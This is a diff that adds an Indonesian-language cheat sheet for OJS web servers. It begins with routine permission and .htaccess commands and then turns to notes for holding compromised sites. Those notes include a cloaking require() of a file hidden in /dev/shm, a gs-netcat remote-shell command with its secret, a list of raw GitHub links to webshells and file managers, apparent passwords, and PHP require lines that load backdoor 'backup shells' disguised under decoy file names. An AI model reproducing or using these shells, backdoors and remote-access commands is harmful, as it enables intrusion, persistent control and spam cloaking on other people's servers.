@@ -1,0 +1,83 @@
+COMMAND MENGUBAH PERMISSION FOLDER
+find /path/to/your/directory -type d -exec chmod 0555 {} \;
+
+COMMAND MENGUBAH PERMISSION FILE
+find /path/ke/ojs/plugins -type f -exec chmod 0644 {} \;
+
+COMMAND MENYEBAR  htaccess KE SELURUH DALAM FOLDER 
+find /path/to/your/ -type d -exec cp .htaccess {} \;
+
+COMMAND MENYALIN FILE htaccess HANYA KE FOLDER YANG BELUM MEMILIKINYA
+find /path/to/your/ -type d ! -exec test -e "{}/.htaccess" \; -exec cp /path/to/your/.htaccess "{}/.htaccess" \;
+
+COMMAND MENGGANTI PERMISSIONS FILE KE SELURUH DALAM FOLDER 
+find /path/folder -type f -name "nama_file" -exec chmod 644 {} \;
+
+COMMAND MENGHAPUS FILE KE SELURUH DALAM FOLDER 
+find /path/folder -type f -name "nama_file" -delete
+
+VERSI MENGHAPUS FILE SAMPAI KE SELURUH DALAM FOLDER DENGAN RM
+find . -type f -name "debug.log" -exec rm -f {} \;
+
+UNTUK MENGHILANGKAN index/of
+Options -Indexes
+Require all denied
+
+PUTARKAN UPLOAD PLUGINS
+lib/pkp/classes/controllers/grid/plugins/PluginGridHandler.inc.php (noted). plugin > plugins
+
+HAPUS UPLOAD PLUGINS
+/lib/pkp/controllers/grid/plugins/form/UploadPluginForm.inc.php
+
+CHMOD UPLOAD USER
+/plugins/importexport/user chmod 000
+
+Perintah ini digunakan untuk mengubah permission (izin akses) pada folder plugins beserta seluruh isinya
+
+find . -type d -not -path "*/\.*" -exec cp /var/www/html/files/index.html {}/index.html \;
+
+untuk claoking di pages/index
+require('/dev/shm/index.php');
+
+gs win
+gs-netcat -s "DDmPKwp6cuNLczkSBoLhYh" -i
+
+SC ALFA RUDY
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/mentahalfarudi.txt
+
+PHOENIX SHEL
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/phoenix-shell.txt
+
+AVATAR SHEL
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/avatar-alfa-shel.txt
+
+AVATAR FILE MANAJER
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/avatar-cloter2.txt
+
+FILE MANAJER
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/filemanajer.txt
+
+ALFA BANGYOG----------
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/alfa-shel-by.txt
+
+WEBSHEL 403
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/webshell.403.txt
+
+ALFA SYLEH
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/shel-syleh.txt
+silehkeraz
+
+CLONE OBS
+https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/clone-obs-txt
+
+avatarlistrik
+090801
+senyumdulu
+
+REQUIRE UNTUK BACKUP SHEL
+
+<?php require ("/dev/shm/AbctractGrid.txt");
+
+<?php require ("/dev/shm/AbstrackFlow.txt");
+
+<?php require ("/dev/shm/AbctractHair.txt");
